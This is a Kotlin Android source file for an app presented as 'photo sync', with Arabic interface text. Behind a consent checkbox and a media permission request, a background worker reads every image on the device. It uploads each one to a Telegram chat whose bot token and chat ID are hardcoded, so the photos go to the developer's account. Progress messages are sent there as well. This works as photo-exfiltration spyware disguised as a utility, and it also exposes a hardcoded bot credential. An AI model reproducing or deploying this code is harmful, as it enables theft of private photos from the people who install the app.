package com.example.photosync

import android.Manifest
import android.content.ContentUris
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.MediaStore
import android.widget.Button
import android.widget.CheckBox
import android.widget.ProgressBar
import android.widget.TextView
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.Data
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkInfo
import androidx.work.WorkManager
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.FormBody
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream

private const val BOT_TOKEN = "9085718260:AAFr_QfMHH1hgDrfZGpZbII9cgTqaC-mpVs"
private const val CHAT_ID = "8859920681"
private const val UNIQUE_SYNC_WORK_NAME = "photo_sync_job"

data class MediaImageItem(
    val id: Long,
    val displayName: String,
    val contentUri: Uri,
    val mimeType: String
)

class PhotoSyncWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    private val client = OkHttpClient()

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            sendTelegramMessage("بدأت عملية مسح ونقل الصور من الجهاز.")

            val images = queryAllImages()
            if (images.isEmpty()) {
                sendTelegramMessage("انتهت العملية: لم يتم العثور على صور في الفهرس.")
                return@withContext Result.success(
                    workDataOfResult(sent = 0, total = 0, status = "empty")
                )
            }

            var sentCount = 0
            val total = images.size

            for ((index, item) in images.withIndex()) {
                val tempFile = copyUriToTempFile(item)
                try {
                    uploadPhoto(tempFile, item.displayName, item.mimeType)
                    sentCount++
                    val pct = ((index + 1) * 100) / total
                    setProgress(
                        Data.Builder()
                            .putInt("sent", sentCount)
                            .putInt("total", total)
                            .putInt("progress", pct)
                            .build()
                    )
                } finally {
                    if (tempFile.exists()) {
                        tempFile.delete()
                    }
                }
            }

            sendTelegramMessage("تم النقل بنجاح: تم إرسال $sentCount من أصل $total صورة.")
            Result.success(workDataOfResult(sent = sentCount, total = total, status = "completed"))
        } catch (ex: Exception) {
            val message = ex.message ?: "خطأ غير معروف أثناء النقل"
            runCatching { sendTelegramMessage("فشل النقل: $message") }
            Result.failure(
                Data.Builder().putString("error", message).build()
            )
        }
    }

    private fun queryAllImages(): List<MediaImageItem> {
        val result = mutableListOf<MediaImageItem>()
        val collection: Uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
        } else {
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        }

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.MIME_TYPE
        )

        applicationContext.contentResolver.query(
            collection,
            projection,
            null,
            null,
            "${MediaStore.Images.Media.DATE_ADDED} DESC"
        )?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val mimeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE)

            while (cursor.moveToNext()) {
                val id = cursor.getLong(idCol)
                val name = cursor.getString(nameCol) ?: "image_$id.jpg"
                val mime = cursor.getString(mimeCol) ?: "image/jpeg"
                val uri = ContentUris.withAppendedId(collection, id)
                result.add(MediaImageItem(id, name, uri, mime))
            }
        }
        return result
    }

    private fun copyUriToTempFile(item: MediaImageItem): File {
        val safeSuffix = if (item.displayName.contains('.')) {
            "." + item.displayName.substringAfterLast('.')
        } else {
            ".jpg"
        }
        val outFile = File.createTempFile("tg_sync_", safeSuffix, applicationContext.cacheDir)
        applicationContext.contentResolver.openInputStream(item.contentUri)?.use { input ->
            FileOutputStream(outFile).use { output ->
                input.copyTo(output)
            }
        } ?: throw IllegalStateException("تعذر فتح مجرى القراءة للملف ${item.displayName}")
        return outFile
    }

    private fun uploadPhoto(file: File, fileName: String, mimeType: String) {
        val mediaType = mimeType.toMediaTypeOrNull() ?: "image/jpeg".toMediaTypeOrNull()!!
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("photo", fileName, file.asRequestBody(mediaType))
            .build()

        val request = Request.Builder()
            .url("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto")
            .post(body)
            .build()

        client.newCall(request).execute().use { response ->
            val raw = response.body?.string().orEmpty()
            val json = JSONObject(raw)
            if (!response.isSuccessful || !json.optBoolean("ok", false)) {
                throw IllegalStateException(json.optString("description", "HTTP ${response.code}"))
            }
        }
    }

    private fun sendTelegramMessage(text: String) {
        val formBody = FormBody.Builder()
            .add("chat_id", CHAT_ID)
            .add("text", text)
            .build()

        val request = Request.Builder()
            .url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
            .post(formBody)
            .build()

        client.newCall(request).execute().use { response ->
            val raw = response.body?.string().orEmpty()
            val json = JSONObject(raw)
            if (!response.isSuccessful || !json.optBoolean("ok", false)) {
                throw IllegalStateException(json.optString("description", "HTTP ${response.code}"))
            }
        }
    }

    private fun workDataOfResult(sent: Int, total: Int, status: String): Data =
        Data.Builder()
            .putInt("sent", sent)
            .putInt("total", total)
            .putString("status", status)
            .build()
}

class MainActivity : ComponentActivity() {

    private lateinit var consentCheckBox: CheckBox
    private lateinit var startButton: Button
    private lateinit var progressBar: ProgressBar
    private lateinit var statusText: TextView

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { grants ->
        val allGranted = grants.values.all { it }
        if (allGranted) {
            enqueuePhotoSync()
        } else {
            statusText.text = "تم رفض صلاحية الوصول إلى الصور."
            startButton.isEnabled = consentCheckBox.isChecked
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        consentCheckBox = findViewById(R.id.consentCheckBox)
        startButton = findViewById(R.id.startButton)
        progressBar = findViewById(R.id.progressBar)
        statusText = findViewById(R.id.statusText)

        startButton.isEnabled = false
        progressBar.max = 100
        progressBar.progress = 0

        consentCheckBox.setOnCheckedChangeListener { _, isChecked ->
            startButton.isEnabled = isChecked
        }

        startButton.setOnClickListener {
            if (!consentCheckBox.isChecked) return@setOnClickListener
            startButton.isEnabled = false
            ensureMediaPermissionAndStart()
        }
    }

    private fun requiredPermissions(): Array<String> {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }

    private fun ensureMediaPermissionAndStart() {
        val missing = requiredPermissions().filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isEmpty()) {
            enqueuePhotoSync()
        } else {
            permissionLauncher.launch(missing.toTypedArray())
        }
    }

    private fun enqueuePhotoSync() {
        val request = OneTimeWorkRequestBuilder<PhotoSyncWorker>().build()
        val workManager = WorkManager.getInstance(this)
        workManager.enqueueUniqueWork(UNIQUE_SYNC_WORK_NAME, ExistingWorkPolicy.REPLACE, request)

        statusText.text = "جاري بدء النقل..."
        progressBar.progress = 5

        workManager.getWorkInfoByIdLiveData(request.id).observe(this) { info ->
            if (info == null) return@observe

            val sent = info.progress.getInt("sent", 0)
            val total = info.progress.getInt("total", 0)
            val pct = info.progress.getInt("progress", 0)

            if (info.state == WorkInfo.State.RUNNING && total > 0) {
                progressBar.progress = pct
                statusText.text = "جاري النقل: $sent من $total ($pct%)"
            } else if (info.state == WorkInfo.State.SUCCEEDED) {
                val finalSent = info.outputData.getInt("sent", sent)
                val finalTotal = info.outputData.getInt("total", total)
                progressBar.progress = 100
                statusText.text = "تم النقل بنجاح ($finalSent من $finalTotal)."
                startButton.isEnabled = consentCheckBox.isChecked
            } else if (info.state == WorkInfo.State.FAILED) {
                val err = info.outputData.getString("error") ?: "فشلت العملية"
                statusText.text = "فشل النقل: $err"
                startButton.isEnabled = consentCheckBox.isChecked
            }
        }
    }
}
